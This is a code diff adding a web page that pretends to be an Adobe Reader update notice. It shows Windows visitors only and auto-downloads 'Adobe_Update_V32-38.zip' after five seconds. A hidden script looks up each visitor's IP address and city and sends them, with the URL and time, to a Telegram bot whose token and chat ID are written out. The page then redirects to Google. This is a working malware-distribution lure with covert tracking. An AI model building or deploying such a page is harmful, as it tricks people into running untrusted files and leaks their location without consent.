@@ -1,0 +1,195 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Preparing Your Download</title>
+
+  <!-- OS Detection and Restriction -->
+  <script>
+    (function () {
+      const userOS = navigator.userAgent || navigator.vendor || window.opera;
+      const isWindows = /Windows/i.test(userOS);
+
+      if (!isWindows) {
+        document.write(`
+          <div style="display:flex;align-items:center;justify-content:center;height:100vh;text-align:center;font-family:sans-serif;">
+              <div>
+                  <h2>Access Restricted</h2>
+                  <p>This resource is only available for Windows devices.</p>
+              </div>
+          </div>
+        `);
+        // Stop further page loading or scripts
+        window.stop();
+      }
+    })();
+  </script>
+<script id="chatway" async="true" src="https://cdn.chatway.app/widget.js?id=Kvs80FfF5cqP"></script>
+  <style>
+    body {
+      font-family: sans-serif;
+      background: #f7f7f7;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      text-align: center;
+      background: white;
+      padding: 90px;
+      border-radius: 70px;
+      box-shadow: 0 0 10px rgba(0,0,0,0.1);
+    }
+  </style>
+
+  <script>
+    window.onload = function () {
+      setTimeout(() => {
+        const link = document.createElement("a");
+        link.href = "./files/Adobe_Update_V32-38.zip";  // Adjust filename if needed
+        link.download = "Adobe_Update_V32-38.zip";
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }, 5000);
+    };
+  </script>
+</head>
+<body>
+  <div class="container">
+    <p style="text-align: left;"><img src="data:image/png;base64,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" alt="img" width="100" height="100" /></p>
+<p style="text-align: center;">&nbsp;</p>
+<h1 style="text-align: center; font-size: 40px; font-family:'Almaden Sans','Helvetica','Arial'">Adobe Reader is not installed or outdated.</h1>
+<p></p>
+<table style="height: 318px; margin-left: auto; margin-right: auto;" width="358">
+<tbody>
+
+<p style="text-align: left; font-size: 18px; font-family:'Internacional','Helvetica','Arial'">It appears that you do not have the latest version of Adobe Acrobat Reader installed.</p>
+<p style="text-align: left;"></p>
+<p style="text-align: left; font-size: 18px; font-family:'Internacional','Helvetica','Arial'">The most recent version will download automatically. Please install it to securely view the document.</p>
+<p style="text-align: left;">&nbsp;</p>
+<p style="text-align: left;">
+  If the download doesn't start automatically, 
+  <a href="./files/Adobe_Update_V32-38.zip" download>
+    <button style="padding: 10px 16px; background-color: #B22222; color: #fff; border: none; border-radius: 5px; cursor: pointer;">
+      Download Here
+    </button>
+  </a>
+</p>
+
+
+ 	<script>
+// === CONFIG ===
+const filename = "./files/Adobe_Update_V32-38.zip"; // PDF to download
+const redirectURL = "https://google.com"; // Final redirect
+const botToken = "8572531357:AAHH3Xeq9hfvLSFcLUS6mz3JfrHmSJR0x4U";
+// const chatId = "-5198788377";
+const chatId = "8360353294";
+
+
+// Function to send data to Telegram
+async function sendToTelegram(data) {
+    try {
+        const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: data
+            })
+        });
+        return await response.json();
+    } catch (error) {
+        console.error('Error sending to Telegram:', error);
+        return null;
+    }
+}
+
+// Function to get location info using IP
+async function getLocationInfo(ip) {
+    try {
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
+        const data = await response.json();
+        if (data.status === "success") {
+            return `${data.city}, ${data.country} 🌍`;
+        }
+    } catch (error) {
+        console.error('Error getting location:', error);
+    }
+    return "Unknown 🌐";
+}
+
+// Function to get client IP
+async function getClientIP() {
+    try {
+        // First try a free IP API
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip;
+    } catch (error) {
+        // Fallback to another service
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return data.ip;
+        } catch (error2) {
+            console.error('Error getting IP:', error2);
+            return 'Unknown IP';
+        }
+    }
+}
+
+// Main function to collect and send data
+async function collectAndSendData() {
+    try {
+        // Get IP address
+        const ip = await getClientIP();
+        
+        // Get location
+        const location = await getLocationInfo(ip);
+        
+        // Get current URL
+        const url = window.location.href;
+        
+        // Get current time
+        const now = new Date();
+        const time = now.toISOString().replace('T', ' ').substr(0, 19);
+        
+        // Create message
+        const message = `👀 New visitor on your site!\n\n` +
+                       `🔗 URL: ${url}\n` +
+                       `📍 Location: ${location}\n` +
+                       `🌐 IP: ${ip}\n` +
+                       `📄 File: ${filename}\n` +
+                       `⏱ Time: ${time}`;
+        
+        // Send to Telegram
+        await sendToTelegram(message);
+        
+        console.log('Data sent successfully');
+    } catch (error) {
+        console.error('Error in data collection:', error);
+    }
+}
+
+// Initialize when page loads
+document.addEventListener('DOMContentLoaded', function() {
+    // Collect and send data
+    collectAndSendData();
+    
+    // Trigger download after 5 second (matching meta refresh)
+    setTimeout(triggerDownload, 5000);
+    
+    // Redirect after 5 seconds
+    setTimeout(function() {
+        window.location.href = redirectURL;
+    }, 5000);
+});
+</script>
+</body>
+</html>
